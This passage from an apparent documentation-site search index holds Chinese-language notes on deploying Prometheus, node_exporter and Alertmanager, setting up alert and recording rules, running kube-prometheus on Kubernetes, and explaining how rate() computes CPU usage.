\u5b58\u50a8\u6570\u636e\u4fdd\u5b58\u591a\u957f\u65f6\u95f4\u7684\uff0c\u9ed8\u8ba415\u5929\uff0c\u8fd9\u4e2a\u9009\u9879\u5728\u8fd9\u4e2a\u7248\u672c\u5df2\u7ecf\u5f03\u7528\uff0c\u7528storage.tsdb.retention.time\u4ee3\u66ff --storage.tsdb.retention.time=STORAGE.TSDB.RETENTION.TIME \u4fdd\u7559\u65f6\u95f4\u9ed8\u8ba4\u4e3a15d\u3002 \u652f\u6301\u7684\u5355\u4f4d\uff1ay\u3001 w\u3001d\u3001h\u3001m\u3001s\u3001ms\u3002 --storage.tsdb.retention.size=STORAGE.TSDB.RETENTION.SIZE [\u5b9e\u9a8c] \u53ef\u4ee5\u4e3a\u5757\u5b58\u50a8\u7684\u6700\u5927\u5b57\u8282\u6570\u3002 \u652f\u6301\u7684\u5355\u4f4d\uff1aKB\u3001MB\u3001GB\u3001TB\u3001PB\u3002 \u6b64\u6807\u5fd7\u662f\u5b9e\u9a8c\u6027\u7684\uff0c\u53ef\u4ee5\u5728\u672a\u6765\u7248\u672c\u4e2d\u66f4\u6539\u3002 --storage.tsdb.no-lockfile \u4e0d\u8981\u5728\u6570\u636e\u76ee\u5f55\u4e2d\u521b\u5efa\u9501\u6587\u4ef6 --storage.tsdb.allow-overlapping-blocks [EXPERIMENTAL] Allow overlapping blocks, which in turn enables vertical compaction and vertical query merge. --storage.tsdb.wal-compression Compress the tsdb WAL. --storage.remote.flush-deadline=<duration> How long to wait flushing sample on shutdown or config reload. --storage.remote.read-sample-limit=5e7 Maximum overall number of samples to return via the remote read interface, in a single query. 0 means no limit. This limit is ignored for streamed response types. --storage.remote.read-concurrent-limit=10 Maximum number of concurrent remote read calls. 0 means no limit. --storage.remote.read-max-bytes-in-frame=1048576 Maximum number of bytes in a single frame for streaming remote read response types before marshalling. Note that client might have limit on frame size as well. 1MB as recommended by protobuf by default. --rules.alert.for-outage-tolerance=1h Max time to tolerate prometheus outage for restoring \"for\" state of alert. --rules.alert.for-grace-period=10m Minimum duration between alert and restored \"for\" state. This is maintained only for alerts with configured \"for\" time greater than grace period. --rules.alert.resend-delay=1m Minimum amount of time to wait before resending an alert to Alertmanager. --alertmanager.notification-queue-capacity=10000 The capacity of the queue for pending Alertmanager notifications. --alertmanager.timeout=10s Timeout for sending alerts to Alertmanager. --query.lookback-delta=5m The maximum lookback duration for retrieving metrics during expression evaluations. --query.timeout=2m Maximum time a query may take before being aborted. --query.max-concurrency=20 \u5e76\u53d1\u6267\u884c\u7684\u6700\u5927\u67e5\u8be2\u6570\u3002 --query.max-samples=50000000 Maximum number of samples a single query can load into memory. Note that queries will fail if they try to load more samples than this into memory, so this also limits the number of samples a query can return. --log.level=info Only log messages with the given severity or above. One of: [debug, info, warn, error] --log.format=logfmt Output format of log messages. One of: [logfmt, json] \u8fd9\u5c31\u90e8\u7f72\u5b8c\u6210\u4e86\uff0c\u8bbf\u95eehttp://192.168.70.130:9090/\u5c31\u80fd\u770b\u5230\u76d1\u63a7\u9875\u9762\u3002\u9ed8\u8ba4\u76d1\u63a7\u81ea\u5df1\uff0c\u90a3\u4e48\u76d1\u63a7\u54ea\u4e9b\u6307\u6807\uff0c\u8bbf\u95eehttp://192.168.70.130:9090/metrics\u5c31\u53ef\u4ee5\u770b\u5230\u4e86\u3002","title":"\u670d\u52a1\u7aef\u90e8\u7f72"},{"location":"monitor/prometheus/prometheus/#_2","text":"exporter\uff1a\u4ee5http\u7684\u65b9\u5f0f\uff0c\u66b4\u9732\u6536\u96c6\u7684metric\uff0c\u7136\u540ePrometheus server\u4f1a\u5b9a\u671f\u6765\u62c9\u53d6\u6570\u636e\uff0c\u53ef\u5b89\u88c5\u5728\u88ab\u76d1\u63a7\u4e3b\u673a node_exporter\u662fexporter\u7684\u4e00\u79cd\uff0c\u7528\u6765\u76d1\u63a7Linux\u4e3b\u673a\uff0c\u5982\u679c\u76d1\u63a7windows\u4e3b\u673a\uff0c\u7528windows_exporter,\u5730\u5740\u5982\u4e0b https://github.com/prometheus-community/windows_exporter \u90e8\u7f72 node_exporter\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/prometheus/node_exporter/releases/tag/v0.18.1 [root@node_exporter ~]# tar zxvf node_exporter-0.18.1.linux-amd64.tar.gz node_exporter-0.18.1.linux-amd64/ node_exporter-0.18.1.linux-amd64/node_exporter node_exporter-0.18.1.linux-amd64/NOTICE node_exporter-0.18.1.linux-amd64/LICENSE [root@node_exporter ~]# mv node_exporter-0.18.1.linux-amd64 /usr/local/node_exporter [root@node_exporter ~]# cd /usr/local/node_exporter/ [root@node_exporter node_exporter]# nohup ./node_exporter > node_exporter.log 2>&1 & [root@node_exporter node_exporter]# ss -tanp | grep node_exporter LISTEN 0 128 [::]:9100 [::]:* users:((\"node_exporter\",pid=1846,fd=3)) \u4fee\u6539\u670d\u52a1\u7aefPrometheus\u914d\u7f6e\uff0c\u7136\u540e\u91cd\u542f\u4f7f\u5176\u914d\u7f6e\u751f\u6548 [root@prometheus prometheus]# cat prometheus.yml # my global config global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configuration alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global 'evaluation_interval'. rule_files: # - \"first_rules.yml\" # - \"second_rules.yml\" # A scrape configuration containing exactly one endpoint to scrape: # Here it's Prometheus itself. scrape_configs: # The job name is added as a label `job=<job_name>` to any timeseries scraped from this config. - job_name: 'prometheus' static_configs: - targets: ['localhost:9090'] - job_name: 'linux' static_configs: - targets: [ '192.168.70.131:9100' ] [root@prometheus prometheus]# ps -ef | grep prome root 1969 1808 0 11:05 pts/0 00:00:02 ./prometheus --config.file=prometheus.yml root 11775 1808 0 12:45 pts/0 00:00:00 grep --color=auto prome [root@prometheus prometheus]# kill -9 1969 [root@prometheus prometheus]# ps -ef | grep prome root 11777 1808 0 12:45 pts/0 00:00:00 grep --color=auto prome [1]+ \u5df2\u6740\u6b7b nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 [root@prometheus prometheus]# ps -ef | grep prome root 11779 1808 0 12:45 pts/0 00:00:00 grep --color=auto prome [root@prometheus prometheus]# nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 & [1] 11786 \u7136\u540e\u67e5\u770bprometheus\u7684\u76d1\u63a7\u76ee\u6807\uff0c\u51fa\u73b0131\u8be5\u673a\u5668","title":"\u5ba2\u6237\u7aef\u90e8\u7f72"},{"location":"monitor/prometheus/prometheus/#alertmanager","text":"Alertmanager \u7528\u4e8e\u53d1\u9001\u544a\u8b66\uff0c \u662f\u771f\u6b63\u53d1\u9001\u4fe1\u606f\u7ed9\u7528\u6237\u7684\u6a21\u5757\u3002 Alertmanager \u4f1a\u63a5\u53d7Prometheus\u53d1\u9001\u8fc7\u6765\u7684\u8b66\u544a\u4fe1\u606f\uff0c\u518d\u7531Alertmanager\u6765\u53d1\u9001\u3002 [root@alertmanager ~]# tar -zxvf alertmanager-0.20.0.linux-amd64.tar.gz alertmanager-0.20.0.linux-amd64/ alertmanager-0.20.0.linux-amd64/LICENSE alertmanager-0.20.0.linux-amd64/alertmanager alertmanager-0.20.0.linux-amd64/amtool alertmanager-0.20.0.linux-amd64/NOTICE alertmanager-0.20.0.linux-amd64/alertmanager.yml [root@alertmanager ~]# mv alertmanager-0.20.0.linux-amd64 /usr/local/alertmanager [root@alertmanager ~]# cd /usr/local/alertmanager/ [root@alertmanager alertmanager]# cat alertmanager.yml global: resolve_timeout: 5m route: group_by: ['alertname'] group_wait: 10s group_interval: 10s repeat_interval: 1h receiver: 'web.hook' receivers: - name: 'web.hook' webhook_configs: - url: 'http://127.0.0.1:5001/' inhibit_rules: - source_match: severity: 'critical' target_match: severity: 'warning' equal: ['alertname', 'dev', 'instance'] [root@alertmanager alertmanager]# nohup ./alertmanager --config.file=./alertmanager.yml > alertmanager.log 2>&1 & \u7136\u540e\u4fee\u6539prometheus\u914d\u7f6e\uff0c\u914d\u7f6e\u4e00\u4e9b\u544a\u8b66 [root@prometheus prometheus]# cat prometheus.yml global: scrape_interval: 1s evaluation_interval: 1s alerting: alertmanagers: - static_configs: - targets: ['192.168.70.133:9093'] rule_files: - rules/*.yml scrape_configs: - job_name: 'prometheus' static_configs: - targets: ['localhost:9090'] - job_name: 'linux' static_configs: - targets: [ '192.168.70.131:9100' ] [root@prometheus prometheus]# cat rules/host.yml groups: - name: Host rules: - alert: running expr: node_procs_running > 0 for: 5s labels: serverity: high annotations: summary: \"{{$labels.instance}}: High running\" description: \"{{$labels.instance}}: running is {{$value}}\" [root@prometheus prometheus]# ps -ef | grep prom root 1168 1 0 13:49 ? 00:00:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient-f52ff6ca-5e7d-4f00-b4f7-679ef47b77da-ens33.lease -pf /var/run/dhclient-ens33.pid -H prometheus ens33 root 1728 1704 0 13:54 pts/0 00:00:03 ./prometheus --config.file=prometheus.yml root 1847 1704 0 14:55 pts/0 00:00:00 grep --color=auto prom [root@prometheus prometheus]# kill -9 1728 [root@prometheus prometheus]# [1]+ \u5df2\u6740\u6b7b nohup ./prometheus --config.file=prometheus.yml > prometheus.log 2>&1 [root@prometheus prometheus]# [root@prometheus prometheus]# nohup ./prometheus --config.file=prometheus.yml --web.enable-lifecycle > prometheus.log 2>&1 & \u8fd9\u91cc\u6709\u4e00\u4e9b\u53c2\u6570\u9700\u8981\u660e\u786e\u4e0b\uff1a evaluation_interval \u544a\u8b66\u7684\u68c0\u6d4b\u5468\u671f\uff0c\u5c31\u662f\u544a\u8b66\u7684\u89e6\u53d1\u5468\u671f\uff0c\u6bd4\u5982\u4f60\u5199\u4e86\u4e00\u4e2a\u68c0\u6d4b\u811a\u672c\u6216\u8005rules\uff0c\u8fd9\u4e2a\u65f6\u95f4\u5c31\u662f\u6bcf\u9694\u591a\u957f\u65f6\u95f4\u53bb\u8c03\u7528\u8fd9\u4e2a\u811a\u672c scrape_interval \u76d1\u63a7\u4fe1\u606f\u7684\u62c9\u53d6\u65f6\u95f4\uff0c\u5c31\u662f\u62c9\u53d6metrics\u7684\u5468\u671f\uff0cPrometheus\u662f\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53bb\u62c9\u53d6target\u4e2d\u7684\u76ee\u6807\u7684metrics \u5728roles\u4e2d expr \u7528\u6765\u89e6\u53d1\u62a5\u8b66\u7684\u516c\u5f0f\uff0c\u53ef\u4ee5\u5728prom\u8f93\u5165\u8fd9\u4e2a\u516c\u5f0f\u67e5\u770b\u5f53\u524d\u503c for \u8fd9\u4e2a\u89e6\u53d1\u6301\u7eed\u4e86\u591a\u4e45\uff0c\u6709\u4e9b\u6307\u6807\u5fc5\u987b\u7ef4\u6301\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u7b97\u5f02\u5e38\uff0c\u5728Prometheus\u4e2d\uff0c\u544a\u8b66\u4e3a3\u79cd\u72b6\u6001\uff0cInactive\u3001Pending\u3001Firing\u4e09\u79cd\uff0cinactive\u5c31\u662f\u6ca1\u6709\u89e6\u53d1\u7684\u544a\u8b66\uff0cPending\u5c31\u662f\u5df2\u7ecf\u89e6\u53d1\u7684\u544a\u8b66\uff0c\u4f46\u662f\u6ca1\u6709\u8fbe\u5230for\u89c4\u5b9a\u7684\u6301\u7eed\u65f6\u957f\uff0cFiring\u5c31\u662f\u5df2\u7ecf\u8fbe\u5230for\u89c4\u5b9a\u7684\u6301\u7eed\u65f6\u957f\u7684\u544a\u8b66\uff0c\u5c31\u662f\u6709\u6548\u544a\u8b66 \u4e0a\u9762\u6211\u76d1\u63a7\u7684\u662f\u4e3b\u673a\u5185\u7684\u6b63\u5728\u8fd0\u884c\u6216\u8005\u53ef\u8fd0\u884c\u7684\u7ebf\u7a0b\u6570\u5927\u4e8e0\u5c31\u544a\u8b66\uff0c\u6b63\u5e38\u8fd9\u4e2a\u503c\u662f\u4e00\u76f4\u5927\u4e8e0\u7684 \u67e5\u770bprometheus\u4e0a\u7684\u544a\u8b66\uff1a \u663e\u793a\u5df2\u7ecf\u6210\u529f\u544a\u8b66 \u7136\u540e\u67e5\u770baltermanager\u4e0a\u7684\u544a\u8b66 \u8bbf\u95ee192.168.70.133:9093 info\u5c31\u662frules\u4e2d\u586b\u5199\u7684\u5185\u5bb9\uff0csource\u70b9\u51fb\u4f1a\u8df3\u8f6c\u53bb\u663e\u793aprometheus\u4e2d\u8be5\u516c\u5f0f\u7684\u5b9e\u65f6\u503c\uff0csilence\u5c31\u662f\u521b\u5efa\u4e00\u6761\u8be5\u544a\u8b66\u7684\u9759\u97f3\u89c4\u5219","title":"\u544a\u8b66\u4e2d\u5fc3 Alertmanager\u90e8\u7f72"},{"location":"monitor/prometheus/prometheus_k8s/","text":"K8S\u73af\u5883\u4e2d\u90e8\u7f72Prometheus \u627e\u4e00\u53f0\u6709kubectl\u547d\u4ee4\u7684\u673a\u5668\uff0c\u5e76\u80fd\u8fde\u63a5\u5230K8S\u96c6\u7fa4\uff0c\u7136\u540e\u514b\u9686\u5b98\u65b9git\u5e93\uff0c\u56e0\u4e3a\u6211\u7684K8S\u662f1.18\uff0c\u6240\u4ee5\u6211\u8981\u514b\u9686 release-0.5\u7248\u672c [root@centos7 ~]# git clone -b release-0.5 https://github.com/prometheus-operator/kube-prometheus.git \u7136\u540e\u76f4\u63a5\u90e8\u7f72\u5373\u53ef [root@centos7 ~]# kubectl apply -f kube-prometheus/manifests/setup/ [root@centos7 ~]# kubectl apply -f kube-prometheus/manifests/* \u7136\u540e\u5c31\u90e8\u7f72\u5b8c\u6210\u4e86","title":"K8S\u90e8\u7f72"},{"location":"monitor/prometheus/prometheus_k8s/#k8sprometheus","text":"\u627e\u4e00\u53f0\u6709kubectl\u547d\u4ee4\u7684\u673a\u5668\uff0c\u5e76\u80fd\u8fde\u63a5\u5230K8S\u96c6\u7fa4\uff0c\u7136\u540e\u514b\u9686\u5b98\u65b9git\u5e93\uff0c\u56e0\u4e3a\u6211\u7684K8S\u662f1.18\uff0c\u6240\u4ee5\u6211\u8981\u514b\u9686 release-0.5\u7248\u672c [root@centos7 ~]# git clone -b release-0.5 https://github.com/prometheus-operator/kube-prometheus.git \u7136\u540e\u76f4\u63a5\u90e8\u7f72\u5373\u53ef [root@centos7 ~]# kubectl apply -f kube-prometheus/manifests/setup/ [root@centos7 ~]# kubectl apply -f kube-prometheus/manifests/* \u7136\u540e\u5c31\u90e8\u7f72\u5b8c\u6210\u4e86","title":"K8S\u73af\u5883\u4e2d\u90e8\u7f72Prometheus"},{"location":"monitor/prometheus/prometheus_rate/","text":"\u4e3a\u4ec0\u4e48rate\u53ef\u4ee5\u8ba1\u7b97CPU\u7684\u4f7f\u7528\u7387 \u5728\u8ba1\u7b97POD\u7684CPU\u4f7f\u7528\u7387\u7684\u65f6\u5019\uff0c\u5b98\u65b9\u7ed9\u51fa\u4e86\u4e00\u4e2a\u8ba1\u7b97\u516c\u5f0f sum (rate (container_cpu_usage_seconds_total{pod_name=~\"$Pod\",namespace=\"$namespace\"}[1m])) by (pod_name) \u53c2\u8003\uff1a https://blog.csdn.net/shm19990131/article/details/107162470 https://www.cnblogs.com/minseo/p/13367692.html https://blog.csdn.net/qq_35753140/article/details/105121525 \u603b\u7ed3\uff1a increase()\u51fd\u6570 increase\u51fd\u6570\u5728Prometheus\u4e2d\uff0c\u662f\u7528\u6765\u9488\u5bf9Counter\u8fd9\u79cd\u6301\u7eed\u589e\u957f\u7684\u6570\u503c\uff0c\u622a\u53d6\u5176\u4e2d\u4e00\u6bb5\u65f6\u95f4\u7684\u589e\u91cf increase(node_cpu[1m])=\u300b\u8fd9\u6837\u5c31\u83b7\u53d6\u4e86CPU\u603b\u4f7f\u7528\u65f6\u95f4\u57281\u5206\u949f\u5185\u7684\u589e\u91cf rate()\u51fd\u6570 \u662f\u4e13\u95e8\u642d\u914dcounter\u7c7b\u578b\u6570\u636e\u4f7f\u7528\u7684\u51fd\u6570 \u5b83\u7684\u529f\u80fd\u662f\u6309\u7167\u8bbe\u7f6e\u4e00\u4e2a\u65f6\u95f4\u6bb5\uff0c\u53d6counter\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u4e2d\u7684\u5e73\u5747\u6bcf\u79d2\u7684\u589e\u91cf rate(metrice[1m]) == increase(metrice[1m])/1m rate\u51fd\u6570\u7b49\u4e8e increase\u7684\u503c\u9664\u4ee5\u65f6\u95f4 \u5728\u8ba1\u7b97\u673a\u4e2d\uff0cCPU\u4f7f\u7528\u7387\u662f\u7edf\u8ba1CPU\u7684\u5728\u4e0d\u540c\u72b6\u6001\u4e0b\u7684CPU\u4f7f\u7528\u65f6\u95f4\u5360\u603b\u65f6\u95f4\u591a\u5c11 \u4f8b\u5982\uff1a cpu0 5\u5206\u949f\u5185\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u7684\u65f6\u95f4\uff1aincrease(node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"}[5m])\uff0cincrease \u7684\u610f\u601d\u662f\u8868\u793a\u589e\u91cf\uff0cnode_cpu_seconds_total \u662f\u5355\u8c03\u9012\u589e\u7684\uff0c\u8fd9\u4e2a\u516c\u5f0f\u7684\u7ed3\u679c\u662f\u5f53\u524d\u65f6\u70b9\u7684 node_cpu_seconds_total \u51cf\u53bb5\u5206\u949f\u4e4b\u524d\u7684 node_cpu_seconds_total\uff0c\u4e5f\u5c31\u662f\u8fd95\u5206\u949f\u4e4b\u5185\u5904\u4e8eidle \u72b6\u6001\u7684 cpu \u65f6\u95f4\u3002 cpu0 5\u5206\u949f\u5185\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u7684\u65f6\u95f4\u5360\u6bd4\uff1aincrease(node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"}[5m]) / increase(node_cpu_seconds_total{cpu=\"0\"}[5m])\uff0c\u5206\u6bcd\u5176\u5b9e\u5c31\u662f5\u5206\u949f=300\u79d2\u3002 \u5206\u6bcd\u548c\u5206\u5b50\u90fd\u662fCounter\u7c7b\u578b\u7684\uff0c\u90fd\u662f\u65f6\u95f4 \u90a3\u4e48\u8fd9\u4e2a\u65f6\u95f4\u5360\u6bd4\u5c31\u662fidle\u7684\u4f7f\u7528\u7387\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528rate(node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"}[5m])\u6765\u8868\u793a \u540c\u7406\uff1a container_cpu_usage_seconds_total \u4ee3\u8868\u7684\u662f\u5bb9\u5668\u5360\u7528\u7684CPU\u65f6\u95f4 1\u5206\u949f\u65f6\u95f4\u5185 container_cpu_usage_seconds_total \u6240\u589e\u957f\u7684\u7684\u503c increase(container_cpu_usage_seconds_total[1m]) \u90a3\u4e48\u5bb9\u5668\u76841\u5206\u949fCPU\u4f7f\u7528\u7387\u5e94\u8be5\u662f increase(container_cpu_usage_seconds_total[1m])/[1m] \u90a3\u4e48\u7528rate\u6765\u7b80\u5316\u516c\u5f0f\u90a3\u4e481\u5206\u949fCPU\u4f7f\u7528\u7387\u5c31\u662f rate (container_cpu_usage_seconds_total[1m])","title":"Prometheus\u6307\u6807\u8bb2\u89e3\"\u4e3a\u4ec0\u4e48rate\u53ef\u4ee5\u8ba1\u7b97CPU\u7684\u4f7f\u7528\u7387\""},{"location":"monitor/prometheus/prometheus_rate/#ratecpu","text":"\u5728\u8ba1\u7b97POD\u7684CPU\u4f7f\u7528\u7387\u7684\u65f6\u5019\uff0c\u5b98\u65b9\u7ed9\u51fa\u4e86\u4e00\u4e2a\u8ba1\u7b97\u516c\u5f0f sum (rate (container_cpu_usage_seconds_total{pod_name=~\"$Pod\",namespace=\"$namespace\"}[1m])) by (pod_name) \u53c2\u8003\uff1a https://blog.csdn.net/shm19990131/article/details/107162470 https://www.cnblogs.com/minseo/p/13367692.html https://blog.csdn.net/qq_35753140/article/details/105121525 \u603b\u7ed3\uff1a increase()\u51fd\u6570 increase\u51fd\u6570\u5728Prometheus\u4e2d\uff0c\u662f\u7528\u6765\u9488\u5bf9Counter\u8fd9\u79cd\u6301\u7eed\u589e\u957f\u7684\u6570\u503c\uff0c\u622a\u53d6\u5176\u4e2d\u4e00\u6bb5\u65f6\u95f4\u7684\u589e\u91cf increase(node_cpu[1m])=\u300b\u8fd9\u6837\u5c31\u83b7\u53d6\u4e86CPU\u603b\u4f7f\u7528\u65f6\u95f4\u57281\u5206\u949f\u5185\u7684\u589e\u91cf rate()\u51fd\u6570 \u662f\u4e13\u95e8\u642d\u914dcounter\u7c7b\u578b\u6570\u636e\u4f7f\u7528\u7684\u51fd\u6570 \u5b83\u7684\u529f\u80fd\u662f\u6309\u7167\u8bbe\u7f6e\u4e00\u4e2a\u65f6\u95f4\u6bb5\uff0c\u53d6counter\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u4e2d\u7684\u5e73\u5747\u6bcf\u79d2\u7684\u589e\u91cf rate(metrice[1m]) == increase(metrice[1m])/1m rate\u51fd\u6570\u7b49\u4e8e increase\u7684\u503c\u9664\u4ee5\u65f6\u95f4 \u5728\u8ba1\u7b97\u673a\u4e2d\uff0cCPU\u4f7f\u7528\u7387\u662f\u7edf\u8ba1CPU\u7684\u5728\u4e0d\u540c\u72b6\u6001\u4e0b\u7684CPU\u4f7f\u7528\u65f6\u95f4\u5360\u603b\u65f6\u95f4\u591a\u5c11 \u4f8b\u5982\uff1a cpu0 5\u5206\u949f\u5185\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u7684\u65f6\u95f4\uff1aincrease(node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"}[5m])\uff0cincrease \u7684\u610f\u601d\u662f\u8868\u793a\u589e\u91cf\uff0cnode_cpu_seconds_total \u662f\u5355\u8c03\u9012\u589e\u7684\uff0c\u8fd9\u4e2a\u516c\u5f0f\u7684\u7ed3\u679c\u662f\u5f53\u524d\u65f6\u70b9\u7684 node_cpu_seconds_total \u51cf\u53bb5\u5206\u949f\u4e4b\u524d\u7684 node_cpu_seconds_total\uff0c\u4e5f\u5c31\u662f\u8fd95\u5206\u949f\u4e4b\u5185\u5904\u4e8eidle \u72b6\u6001\u7684 cpu \u65f6\u95f4\u3002 cpu0 5\u5206\u949f\u5185\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u7684\u65f6\u95f4\u5360\u6bd4\uff1aincrease(node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"}[5m]) / increase(node_cpu_seconds_total{cpu=\"0\"}[5m])\uff0c\u5206\u6bcd\u5176\u5b9e\u5c31\u662f5\u5206\u949f=300\u79d2\u3002 \u5206\u6bcd\u548c\u5206\u5b50\u90fd\u662fCounter\u7c7b\u578b\u7684\uff0c\u90fd\u662f\u65f6\u95f4 \u90a3\u4e48\u8fd9\u4e2a\u65f6\u95f4\u5360\u6bd4\u5c31\u662fidle\u7684\u4f7f\u7528\u7387\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528rate(node_cpu_seconds_total{cpu=\"0\",mode=\"idle\"}[5m])\u6765\u8868\u793a \u540c\u7406\uff1a container_cpu_usage_seconds_total \u4ee3\u8868\u7684\u662f\u5bb9\u5668\u5360\u7528\u7684CPU\u65f6\u95f4 1\u5206\u949f\u65f6\u95f4\u5185 container_cpu_usage_seconds_total \u6240\u589e\u957f\u7684\u7684\u503c increase(container_cpu_usage_seconds_total[1m]) \u90a3\u4e48\u5bb9\u5668\u76841\u5206\u949fCPU\u4f7f\u7528\u7387\u5e94\u8be5\u662f increase(container_cpu_usage_seconds_total[1m])/[1m] \u90a3\u4e48\u7528rate\u6765\u7b80\u5316\u516c\u5f0f\u90a3\u4e481\u5206\u949fCPU\u4f7f\u7528\u7387\u5c31\u662f rate (container_cpu_usage_seconds_total[1m])","title":"\u4e3a\u4ec0\u4e48rate\u53ef\u4ee5\u8ba1\u7b97CPU\u7684\u4f7f\u7528\u7387"},{"location":"monitor/prometheus/prometheus_recording_rule/","text":"recording_rules RECORDING RULES\u662f Prometheus\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u5728\u91c7\u96c6\u4fa7\u9884\u5148\u8ba1\u7b97 \u9700\u8981\u4e9brule_files\u6587\u4ef6\uff0c\u7136\u540e\u5728Prometheus\u914d\u7f6e\u6587\u4ef6\u4e2d\u8fdb\u884c\u914d\u7f6e \u914d\u7f6e\u6587\u4ef6\u8be6\u89e3\uff1ahttps://prometheus.io/docs/prometheus/latest/configuration/configuration/ Prometheus\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a rule_files: [ - <filepath_glob> ... ] rule_files\u4e66\u5199\u65b9\u6cd5\uff1ahttps://prometheus.io/docs/prometheus/latest/configuration/recording_rules/ rule_files\u8be6\u89e3 github\u4e0a\u7684\u4f8b\u5b50\uff1ahttps://github.com/helm/charts/blob/master/stable/prometheus-operator/templates/prometheus/rules/k8s.rules.yaml rules: - expr: sum(rate(container_cpu_usage_seconds_total{job=\"kubelet\", image!=\"\", container_name!=\"\"}[5m])) by (namespace) record: namespace:container_cpu_usage_seconds_total:sum_rate expr \u662fPrometheus\u7684\u8ba1\u7b97\u65b9\u6cd5 record \u662f\u8ba1\u7b97\u65b9\u6cd5\u7684\u7ed3\u679c\uff0c\u5e76\u91cd\u65b0\u5b9a\u4e49\u6307\u6807 \u52a0\u8f7d\u8fd9\u4e9b\u89c4\u5219\u540e\uff0c\u5728PromSQL\u4e2d namespace:container_cpu_usage_seconds_total:sum_rate \u7b49\u540c\u4e8e sum(rate(container_cpu_usage_seconds_total{job=\"kubelet\", image!=\"\", container_name!=\"\"}[5m])) by (namespace) \u53ef\u4ee5\u7b80\u5316PromSQL\u7684\u5199\u6cd5 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u6307\u6807\uff0c\u5c31\u53ef\u4ee5\u5728\u754c\u9762\u4e0a\u76f4\u63a5\u67e5\u8be2\u5230\uff1a","title":"Prometheus recording_rules\u529f\u80fd"},{"location":"monitor/prometheus/prometheus_recording_rule/#recording_rules","text":"RECORDING RULES\u662f Prometheus\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u5728\u91c7\u96c6\u4fa7\u9884\u5148\u8ba1\u7b97 \u9700\u8981\u4e9brule_files\u6587\u4ef6\uff0c\u7136\u540e\u5728Prometheus\u914d\u7f6e\u6587\u4ef6\u4e2d\u8fdb\u884c\u914d\u7f6e \u914d\u7f6e\u6587\u4ef6\u8be6\u89e3\uff1ahttps://prometheus.io/docs/prometheus/latest/configuration/configuration/ Prometheus\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a rule_files: [ - <filepath_glob> ... ] rule_files\u4e66\u5199\u65b9\u6cd5\uff1ahttps://prometheus.io/docs/prometheus/latest/configuration/recording_rules/","title":"recording_rules"},{"location":"monitor/prometheus/prometheus_recording_rule/#rule_files","text":"github\u4e0a\u7684\u4f8b\u5b50\uff1ahttps://github.com/helm/charts/blob/master/stable/prometheus-operator/templates/prometheus/rules/k8s.rules.yaml rules: - expr: sum(rate(container_cpu_usage_seconds_total{job=\"kubelet\", image!=\"\", container_name!=\"\"}[5m])) by (namespace) record: namespace:container_cpu_usage_seconds_total:sum_rate expr \u662fPrometheus\u7684\u8ba1\u7b97\u65b9\u6cd5 record \u662f\u8ba1\u7b97\u65b9\u6cd5\u7684\u7ed3\u679c\uff0c\u5e76\u91cd\u65b0\u5b9a\u4e49\u6307\u6807 \u52a0\u8f7d\u8fd9\u4e9b\u89c4\u5219\u540e\uff0c\u5728PromSQL\u4e2d namespace:container_cpu_usage_seconds_total:sum_rate \u7b49\u540c\u4e8e sum(rate(container_cpu_usage_seconds_total{job=\"kubelet\", image!=\"\", container_name!=\"\"}[5m])) by (namespace) \u53ef\u4ee5\u7b80\u5316PromSQL\u7684\u5199\u6cd5 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u6307\u6807\uff0c\u5c31\u53ef\u4ee5\u5728\u754c\u9762\u4e0a\u76f4\u63a5\u67e5\u8be2\u5230\uff1a","title":"rule_files\u8be6\u89e3"},{"location":"monitor/prometheus/query_rules/","text":"metric\u4ecb\u7ecd\uff0cPrometheus\u672c\u8d28\u4e0a\u662f\u65f6\u5e8f\u6570\u636e\u5e93\uff0cPrometheus\u4f1a\u5c06\u6240\u6709\u91c7\u96c6\u5230\u7684\u6837\u672c\u6570\u636e\u4ee5\u65f6\u95f4\u5e8f\u5217\u7684\u65b9\u5f0f\u4fdd\u5b58\u5728\u5185\u5b58\u6570\u636e\u5e93\u4e2d\uff0c\u5e76\u4e14\u5b9a\u65f6\u4fdd\u5b58\u5230\u786c\u76d8\u4e0a \u6570\u636e\u7ed3\u6784\u5982\u4e0b\u56fe\uff1a \u5728Prometheus\u7684\u4e16\u754c\u91cc\u9762\uff0c\u6240\u6709\u7684\u6570\u503c\u90fd\u662f64 bit\u7684\u3002\u6bcf\u6761\u65f6\u95f4\u5e8f\u5217\u91cc\u9762\u8bb0\u5f55\u7684\u5c31\u662f64 bit Timestamp\uff08\u65f6\u95f4\u6233\uff09\u548c64 bit\u7684Sample Value\uff08\u91c7\u6837\u503c\uff09 \u5728prometheus\u6709\u4e24\u79cd\u67e5\u8be2\u65b9\u5f0f\uff0c\u67e5\u8be2\u4e00\u822c\u662f\u4e0d\u5e26\u65f6\u95f4\u7684\uff0c\u8be5\u4e24\u79cd\u65b9\u5f0f\u5982\u4e0b\uff0c 